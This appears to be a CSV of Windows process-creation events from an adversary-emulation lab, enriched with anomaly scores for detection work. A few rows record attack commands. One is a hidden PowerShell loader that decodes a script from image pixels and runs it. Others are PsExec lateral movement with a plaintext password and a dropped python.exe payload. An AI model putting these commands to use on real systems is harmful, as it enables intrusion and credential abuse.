ProcessName,SubjectUserName,@timestamp,host,Hostname,EventID,SubjectLogonId,ProcessId,LogonType,TargetLogonId,WorkstationName,IpAddress,TargetUserName,PrivilegeList,CommandLine,ParentProcessName,NewProcessId,is_remote_logon,was_elevated,anomaly_score,detection_source,NewProcessPath,NewProcessName,ParentProcessNameOnly,suspicious_office_spawn,suspicious_svchost,exit_time,duration_seconds,pair_key,pair_frequency
,pbeesly,2020-05-02 02:58:44.904000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0x131c,,0x0,,,-,,"""PowerShell.exe"" -noni -noexit -ep bypass -window hidden -c ""sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))""",C:\Windows\System32\control.exe,0xba0,,,-1,proc_anomaly,"""PowerShell.exe""",powershell.exe,control.exe,False,False,2020-05-02 03:18:33.253000+00:00,1188.3490000000004,control.exe -> powershell.exe,1.0
,pbeesly,2020-05-02 02:58:44.912000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xba0,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x1064,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:18:33.257000+00:00,1188.345,powershell.exe -> conhost.exe,6.0
,NASHUA$,2020-05-02 02:59:38.949000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x23e8,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:41.215000+00:00,2.266,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 02:59:16.675000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x884,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:21.315000+00:00,4.6400000000000015,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 02:59:16.684000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\System32\svchost.exe,0x1a7c,,,-1,proc_anomaly,C:\Windows\System32\RuntimeBroker.exe,runtimebroker.exe,svchost.exe,False,False,2020-05-02 03:00:37.246000+00:00,80.56200000000003,svchost.exe -> runtimebroker.exe,8.0
,SCRANTON$,2020-05-02 02:59:23.719000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0xf10,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:27.305000+00:00,3.5860000000000003,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 02:59:50.621000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1320,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:51.996000+00:00,1.375,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:00:10.287000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1bdc,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:18:28.084000+00:00,1097.797,svchost.exe -> backgroundtaskhost.exe,18.0
,NEWYORK$,2020-05-02 03:01:29.774000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x0,,,-,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x14e0,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:02:49.631000+00:00,79.857,svchost.exe -> wmiprvse.exe,14.0
,NEWYORK$,2020-05-02 03:16:36.688000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x0,,,-,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x15f8,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:17:50.805000+00:00,74.117,svchost.exe -> wmiprvse.exe,14.0
,NEWYORK$,2020-05-02 03:16:39.321000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x3e4,,,NEWYORK$,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x610,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:17:50.805000+00:00,71.48400000000002,svchost.exe -> wmiprvse.exe,14.0
,pbeesly,2020-05-02 03:16:42.978000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x89177d,0x87c,,0x0,,,-,,C:\windows\system32\cmd.exe,C:\Windows\Temp\python.exe,0x2244,,,-1,proc_anomaly,C:\windows\system32\cmd.exe,cmd.exe,python.exe,False,False,2020-05-02 03:17:57.838000+00:00,74.86,python.exe -> cmd.exe,1.0
,SCRANTON$,2020-05-02 03:05:30.723000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\System32\svchost.exe -k WerSvcGroup,C:\Windows\System32\services.exe,0x1604,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:07:33.442000+00:00,122.719,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:05:31.851000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s wlidsvc,C:\Windows\System32\services.exe,0x20cc,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:08:42.051000+00:00,190.2,services.exe -> svchost.exe,24.0
,pbeesly,2020-05-02 03:05:58.512000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xdd8,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x196c,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:07:56.859000+00:00,118.347,powershell.exe -> conhost.exe,6.0
,pbeesly,2020-05-02 03:06:09.919000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0x1158,,0x0,,,-,,"""C:\windows\system32\notepad.exe"" ",C:\Windows\explorer.exe,0x1b54,,,-1,proc_anomaly,"""C:\windows\system32\notepad.exe""",notepad.exe,explorer.exe,False,False,2020-05-02 03:18:25.038000+00:00,735.1189999999999,explorer.exe -> notepad.exe,1.0
,SCRANTON$,2020-05-02 03:06:14.119000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",C:\Windows\System32\svchost.exe,0x18f4,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:07:15.085000+00:00,60.966,svchost.exe -> backgroundtaskhost.exe,18.0
,NEWYORK$,2020-05-02 03:06:14.184000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x2b8,,0x0,,,-,,C:\windows\system32\svchost.exe -k wusvcs -p -s WaaSMedicSvc,C:\Windows\System32\services.exe,0x1214,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:07:15.089000+00:00,60.905,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:08:52.499000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3e4,,,SCRANTON$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x1f40,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:10:23.340000+00:00,90.841,svchost.exe -> wmiprvse.exe,14.0
,SCRANTON$,2020-05-02 03:10:24.460000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3e4,,,SCRANTON$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x47c,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:11:55.428000+00:00,90.96799999999999,svchost.exe -> wmiprvse.exe,14.0
,NASHUA$,2020-05-02 03:10:40.675000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s gpsvc,C:\Windows\System32\services.exe,0x16a0,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:20:47.247000+00:00,606.572,services.exe -> svchost.exe,24.0
,pbeesly,2020-05-02 03:11:20.078000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xf0c,,0x0,,,-,,"""C:\Program Files\SysinternalsSuite\PsExec64.exe"" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0xa6c,,,-1,proc_anomaly,"""C:\Program",program,powershell.exe,False,False,2020-05-02 03:19:26.010000+00:00,485.93199999999996,powershell.exe -> program,7.0
,SCRANTON$,2020-05-02 03:14:16.772000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1650,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:14:20.313000+00:00,3.5410000000000004,svchost.exe -> backgroundtaskhost.exe,18.0
,pbeesly,2020-05-02 03:06:59.643000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0x1464,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x6c0,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:07:50.836000+00:00,51.19300000000001,powershell.exe -> conhost.exe,6.0
,LOCAL SERVICE,2020-05-02 03:14:24.519000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e5,0xa0c,,0x0,,,-,,C:\windows\system32\AUDIODG.EXE 0x410 0x40c,C:\Windows\System32\svchost.exe,0xa68,,,-1,proc_anomaly,C:\windows\system32\AUDIODG.EXE,audiodg.exe,svchost.exe,False,False,2020-05-02 03:19:28.260000+00:00,303.7410000000001,svchost.exe -> audiodg.exe,1.0
,NASHUA$,2020-05-02 03:14:34.890000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x224c,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:14:37.202000+00:00,2.3120000000000003,svchost.exe -> backgroundtaskhost.exe,18.0
,pbeesly,2020-05-02 03:14:44.387000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xf0c,,0x0,,,-,,"""C:\Program Files\SysinternalsSuite\PsExec64.exe"" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x22e0,,,-1,proc_anomaly,"""C:\Program",program,powershell.exe,False,False,2020-05-02 03:18:22.014000+00:00,217.627,powershell.exe -> program,7.0
,NASHUA$,2020-05-02 03:15:05.593000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\PSEXESVC.exe,C:\Windows\System32\services.exe,0x658,,,-1,proc_anomaly,C:\windows\PSEXESVC.exe,psexesvc.exe,services.exe,False,False,2020-05-02 03:18:22.014000+00:00,196.421,services.exe -> psexesvc.exe,4.0
,NASHUA$,2020-05-02 03:15:05.621000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x658,,0x89177d,,,pbeesly,,"""C:\Windows\Temp\python.exe"" ",C:\Windows\PSEXESVC.exe,0xb88,,,-1,proc_anomaly,"""C:\Windows\Temp\python.exe""",python.exe,psexesvc.exe,False,False,2020-05-02 03:17:59.850000+00:00,174.229,psexesvc.exe -> python.exe,4.0
,pbeesly,2020-05-02 03:15:05.629000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x89177d,0xb88,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\Temp\python.exe,0x222c,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,python.exe,False,False,2020-05-02 03:17:59.851000+00:00,174.222,python.exe -> conhost.exe,4.0
,pbeesly,2020-05-02 03:15:05.630000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x89177d,0xb88,,0x0,,,-,,"""C:\Windows\Temp\python.exe"" ",C:\Windows\Temp\python.exe,0x87c,,,-1,proc_anomaly,"""C:\Windows\Temp\python.exe""",python.exe,python.exe,False,False,2020-05-02 03:17:59.849000+00:00,174.21900000000005,python.exe -> python.exe,1.0
,pbeesly,2020-05-02 03:15:49.987000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x89177d,0x87c,,0x0,,,-,,powershell.exe,C:\Windows\Temp\python.exe,0x130c,,,-1,proc_anomaly,powershell.exe,powershell.exe,python.exe,False,False,2020-05-02 03:16:29.891000+00:00,39.904,python.exe -> powershell.exe,1.0
,NEWYORK$,2020-05-02 03:16:30.899000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x0,,,-,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0xc64,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:17:50.805000+00:00,79.906,svchost.exe -> wmiprvse.exe,14.0
,SCRANTON$,2020-05-02 03:16:53.493000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1cac,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:16:54.670000+00:00,1.177,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:17:12.923000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x2204,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:17:14.069000+00:00,1.146,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 03:17:27.341000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1218,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:17:27.348000+00:00,0.006999999999999999,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:17:45.690000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1e4c,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:17:45.697000+00:00,0.006999999999999999,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 03:19:31.433000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k LocalSystemNetworkRestricted -s WPDBusEnum,C:\Windows\System32\services.exe,0x73c,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:22:47.943000+00:00,196.51,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:19:32.481000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x498,,0x0,,,-,,taskhostw.exe ExploitGuardPolicy,C:\Windows\System32\svchost.exe,0x824,,,-1,proc_anomaly,taskhostw.exe,taskhostw.exe,svchost.exe,False,False,2020-05-02 03:20:01.059000+00:00,28.578000000000007,svchost.exe -> taskhostw.exe,10.0
,SCRANTON$,2020-05-02 03:19:34.253000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\System32\svchost.exe -k NetSvcs -p -s NcaSvc,C:\Windows\System32\services.exe,0x820,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:19:34.267000+00:00,0.013999999999999999,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:20:00.672000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x3e4,,,SCRANTON$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x1098,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:22:49.997000+00:00,169.32500000000005,svchost.exe -> wmiprvse.exe,14.0
,SCRANTON$,2020-05-02 03:20:55.868000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s NgcSvc,C:\Windows\System32\services.exe,0x19a4,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:23:02.319000+00:00,126.451,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:21:01.815000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:Microsoft.MicrosoftOfficeHub.AppX54h2e8jwdm50fj5ha8987vz1etpx7czd.mca",C:\Windows\System32\svchost.exe,0xe08,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:22:10.993000+00:00,69.178,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 03:21:08.297000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",C:\Windows\System32\svchost.exe,0x1e34,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:22:09.719000+00:00,61.422,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:21:55.982000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x3e4,,,NASHUA$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x22c8,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:24:04.126000+00:00,128.144,svchost.exe -> wmiprvse.exe,14.0
,UTICA$,2020-05-02 03:22:30.609000+00:00,wec.internal.cloudapp.net,UTICA.dmevals.local,4688,0x3e7,0x384,,0x3e4,,,UTICA$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x1258,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:24:09.175000+00:00,98.566,svchost.exe -> wmiprvse.exe,14.0
,SCRANTON$,2020-05-02 03:22:51.096000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",C:\Windows\System32\svchost.exe,0x1124,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:23:51.981000+00:00,60.88500000000001,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:25:34.881000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x0,,,-,,C:\Windows\System32\usocoreworker.exe -Embedding,C:\Windows\System32\svchost.exe,0x1828,,,-1,proc_anomaly,C:\Windows\System32\usocoreworker.exe,usocoreworker.exe,svchost.exe,False,False,2020-05-02 03:26:41.515000+00:00,66.634,svchost.exe -> usocoreworker.exe,2.0
,UTICA$,2020-05-02 03:26:13.314000+00:00,wec.internal.cloudapp.net,UTICA.dmevals.local,4688,0x3e7,0x384,,0x0,,,-,,C:\Windows\System32\usocoreworker.exe -Embedding,C:\Windows\System32\svchost.exe,0x1488,,,-1,proc_anomaly,C:\Windows\System32\usocoreworker.exe,usocoreworker.exe,svchost.exe,False,False,2020-05-02 03:27:20.837000+00:00,67.52300000000001,svchost.exe -> usocoreworker.exe,2.0
